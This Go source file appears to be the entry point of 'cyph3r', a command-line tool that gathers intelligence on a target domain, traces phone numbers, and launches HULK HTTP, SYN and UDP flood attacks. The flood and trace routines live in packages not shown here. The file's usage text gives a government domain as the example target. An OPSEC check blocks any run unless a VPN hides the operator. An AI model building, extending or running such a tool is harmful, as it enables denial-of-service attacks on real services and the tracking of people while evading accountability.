package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"time"

	"github.com/AnonPhoenix420/cyph3r/internal/intel"
	"github.com/AnonPhoenix420/cyph3r/internal/output"
)

func main() {
	// Flags
	target  := flag.String("t", "", "Target domain (e.g., president.ir)")
	phone   := flag.String("p", "", "Phone number trace")
	testVec := flag.String("test", "", "Tactical Vector: SYN, UDP, HULK")
	pps     := flag.Int("pps", 10, "Speed: Packets Per Second")
	sec     := flag.Int("time", 30, "Duration of test in seconds")
	verbose := flag.Bool("v", false, "Enable Raw JSON output")

	flag.Usage = func() {
		output.Banner()
		fmt.Printf("\n\033[38;5;39m--- CYPH3R COMMAND INTERFACE ---\033[0m\n")
		fmt.Printf("\033[38;5;82mRECON:\033[0m\n")
		fmt.Println("  ./cyph3r -t <domain>          Deep infrastructure intel")
		fmt.Println("  ./cyph3r -p <number>          Mobile intelligence trace")
		
		fmt.Printf("\n\033[38;5;196mTACTICAL (GHOST MODE):\033[0m\n")
		fmt.Println("  -test HULK   High-volume L7 flood (Bypasses Cache)")
		fmt.Println("  -test SYN    TCP Half-open handshake exhaustion")
		fmt.Println("  -test UDP    Volumetric UDP bandwidth saturation")
		
		fmt.Printf("\n\033[38;5;214mSETTINGS:\033[0m\n")
		fmt.Println("  -pps <10-50>  Packets per second (Speed control)")
		fmt.Println("  -time <sec>   Auto-kill timer (Safety first)")
		fmt.Println("---------------------------------------------------\n")
	}

	flag.Parse()
	output.Banner()

	// OPSEC KILL-SWITCH
	shield := intel.CheckShield()
	output.PrintShieldStatus(shield.IsActive, shield.Location, shield.ISP)

	if !shield.IsActive {
		fmt.Printf("\n\033[31m[!] GHOST_MODE FAILURE: VPN Connection Required.\033[0m\n")
		os.Exit(1)
	}

	if *target != "" {
		runTargetScan(*target, *verbose)
		if *testVec != "" {
			executeTactical(*target, *testVec, *pps, *sec)
		}
		os.Exit(0)
	} else if *phone != "" {
		runPhoneTrace(*phone)
		os.Exit(0)
	} else {
		flag.Usage()
	}
}

func runTargetScan(t string, v bool) {
	done := make(chan bool); go output.LoadingAnimation(done, t)
	data, err := intel.GetTargetIntel(t); done <- true
	if err != nil { fmt.Printf("\n[!] ERROR: %v\n", err); os.Exit(1) }
	output.DisplayHUD(data, v)
}

func executeTactical(t, v string, s, d int) {
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(d)*time.Second)
	defer cancel()
	intel.RunTacticalTest(intel.TacticalConfig{Target: t, Vector: v, PPS: s}, ctx)
}

func runPhoneTrace(n string) {
	done := make(chan bool); go output.LoadingAnimation(done, n)
	data, _ := intel.GetPhoneIntel(n); done <- true
	output.DisplayPhoneHUD(data)
}
